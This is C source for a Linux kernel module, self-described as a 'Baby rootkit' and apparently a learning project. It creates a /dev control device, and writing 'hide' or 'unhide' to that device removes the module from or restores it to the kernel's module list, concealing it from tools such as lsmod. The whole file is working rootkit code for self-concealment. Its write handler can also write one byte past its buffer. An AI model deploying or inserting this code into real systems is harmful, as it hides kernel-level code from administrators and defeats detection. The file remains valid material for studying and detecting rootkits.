#include <linux/module.h> // required for all LKMs
#include <linux/init.h> // required for __init and __exit
#include <linux/uaccess.h> // needed for put_user()
//#include <linux/fs.h> // needed for register_chardev
#include <linux/cdev.h> // needed for device_destroy()
#include <linux/seq_file.h> /* seq_read, seq_lseek, single_release */
//#include <linux/kernel.h>
//#include <linux/sched.h>
//#include <linux/oom.h>

#define BUFF_LEN 1024
MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Zach");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Baby rootkit");

static char* filename = THIS_MODULE->name;
static char* msg_ptr;
static char msg[BUFF_LEN];
module_param(filename, charp, 0000);
MODULE_PARM_DESC(filename, "Filename in /dev");
static int major = -1;
static struct cdev mycdev;
static struct class *myclass = NULL;
static struct list_head * prev;
static int hidden = 0;

static char status_str[BUFF_LEN];
static char * status_str_ptr;

int device_open_count = 0;

static int hide_self(void);
static int unhide_self(void);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);

static ssize_t device_read(struct file *filp,
		char *buffer,
		size_t length,
		loff_t *offset)
{
	int bytes_read = 0;
	while (length && *status_str_ptr) {
		put_user(*(status_str_ptr++), buffer++);
		length--;
		bytes_read++;
	}
	return bytes_read;
}


static void cleanup(int device_created)
{
	if (device_created) {
		device_destroy(myclass, major);
		cdev_del(&mycdev);
	}
	if (myclass)
		class_destroy(myclass);
	if (major != -1)
		unregister_chrdev_region(major, 1);
}

static const struct file_operations file_ops = { // operations on our /dev/$filename file
	.read = device_read,               // and their associated functions
	.write = device_write,
	.open = device_open,
	.release = device_release
};

static void parse_command(char * cmd) {
	int hide;
	int unhide;
	pr_info("In parse_command.\n");
	pr_info("Our command: '%s'", cmd);
	hide = strncmp(cmd, "hide\n", BUFF_LEN);
	pr_info("Hide? %d\n", hide);
	if (hide == 0) {
		hide_self();
		return;
	}
	unhide = strncmp(cmd, "unhide\n", BUFF_LEN);
	pr_info("Unhide? %d\n", unhide);
	if (unhide == 0) {
		unhide_self();
		return;
	}
	

}

// Called when a process tries to write to our device 
static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset) {
	int i;

	for (i = 0; i < len && i < BUFF_LEN; i++)
		get_user(msg[i], buffer + i);

	msg[i] = 0; // null terminating byte; very important!
	msg_ptr = msg;

	/* 
	 * Again, return the number of input characters used 
	 */
	pr_info("about to parse command: %s", msg);
	parse_command(msg);
	return i;
}


// Called when a process opens our device
static int device_open(struct inode *inode, struct file *file)
{

	/* 
	 * We don't want to talk to two processes at the same time 
	 */
	if (device_open_count)
		return -EBUSY;

	device_open_count++;
	/*
	 * Initialize the message 
	 */
	msg_ptr = msg;
	status_str_ptr = status_str;
	try_module_get(THIS_MODULE);
	return 0;
}

// Called when a process closes our device 
static int device_release(struct inode *inode, struct file *file) {
	// Decrement the open counter and usage count. Without this, the module would not unload.
	device_open_count--;
	module_put(THIS_MODULE);
	return 0;
}
static int hide_self(void) {
	pr_info("In hide_self\n");
	if (hidden) {
		pr_info("Uh oh, hidden != 0\n");
		strncpy(status_str, "Error: already hidden!\n", BUFF_LEN);
		return -1;
	}
	prev = THIS_MODULE->list.prev;
	mutex_lock(&module_mutex);
	list_del(&THIS_MODULE->list);
	mutex_unlock(&module_mutex);
	hidden = 1;
	strncpy(status_str, "Successfully hid.\n", BUFF_LEN);
	return 0;

}

static int unhide_self(void) {
	pr_info("In unhide_self\n");
	if (hidden == 0) {
		pr_info("Uh oh, hidden == 0\n");

		strncpy(status_str, "Error: already visible!\n", BUFF_LEN);
		return -1;
	}
	mutex_lock(&module_mutex);
	list_add(&THIS_MODULE->list, prev);
	mutex_unlock(&module_mutex);
	hidden = 0;
	strncpy(status_str, "Successfully unhid!\n", BUFF_LEN);
	return 0;
}

static int __init mod_init(void) {
	int device_created = 0;
	pr_info("%s: starting up\n", THIS_MODULE->name);
	pr_info("%s: filename='%s'\n", THIS_MODULE->name, filename);
	pr_info("%s: registering device %s\n", THIS_MODULE->name, filename);

	/* cat /proc/devices */
	if (alloc_chrdev_region(&major, 0, 1, filename) < 0) {
		goto error;
	}
	/* ls /sys/class */
	if ((myclass = class_create(THIS_MODULE, filename)) == NULL) {
		goto error;
	}
	/* ls /dev/ */
	if (device_create(myclass, NULL, major, NULL, filename) == NULL) {
		goto error;
	}
	device_created = 1;
	cdev_init(&mycdev, &file_ops);
	if (cdev_add(&mycdev, major, 1) == -1){
		goto error;
	}
	pr_info("%s: succesfully registered!\n", THIS_MODULE->name);
	snprintf(status_str, BUFF_LEN, "%s initialized and awaiting command!\n", THIS_MODULE->name);
	return 0;
error:
	cleanup(device_created);
	return -1;
}


static void __exit mod_exit(void) {
	cleanup(1);
	pr_info("Goodbye, world.\n");
}

module_init(mod_init);
module_exit(mod_exit);
